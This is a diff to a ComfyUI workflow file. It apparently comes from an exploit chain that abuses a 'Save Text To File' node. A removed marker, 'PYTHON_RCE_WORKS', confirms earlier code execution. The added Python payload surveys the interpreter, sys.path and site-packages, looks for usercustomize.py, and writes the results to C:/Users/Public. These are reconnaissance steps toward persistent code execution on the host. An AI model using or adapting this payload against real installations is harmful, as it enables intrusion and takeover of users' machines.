@@ -1,9 +1,9 @@
 {
   "1": {
     "inputs": {
-      "multiline_text": "PYTHON_RCE_WORKS",
-      "output_file_path": ".",
-      "file_name": "rce_confirm",
+      "multiline_text": "\nimport os, sys, json, site\noutput = {}\noutput[\"cwd\"] = os.getcwd()\noutput[\"executable\"] = sys.executable\noutput[\"prefix\"] = sys.prefix\noutput[\"base_prefix\"] = sys.base_prefix\noutput[\"path\"] = sys.path[:15]\noutput[\"user_site\"] = site.getusersitepackages() if hasattr(site, \"getusersitepackages\") else \"N/A\"\noutput[\"user_base\"] = site.getuserbase() if hasattr(site, \"getuserbase\") else \"N/A\"\noutput[\"site_packages\"] = [p for p in sys.path if \"site-packages\" in p]\n\n# Check where usercustomize.py SHOULD be\nfor p in sys.path:\n    if os.path.exists(os.path.join(p, \"usercustomize.py\")):\n        output[f\"usercustomize_in_{p}\"] = \"EXISTS\"\n\n# Write to userdata directory via ComfyUI's own output mechanism\noutput_dir = os.path.join(os.getcwd(), \"output\")\nif not os.path.exists(output_dir):\n    output_dir = os.path.join(os.getcwd(), \"user\", \"default\")\n\nwith open(\"C:/Users/Public/python_env_info.json\", \"w\") as f:\n    json.dump(output, f, indent=2)\n",
+      "output_file_path": "C:/Users/Public",
+      "file_name": "find_python_path",
       "file_extension": "txt"
     },
     "class_type": "CR Save Text To File"
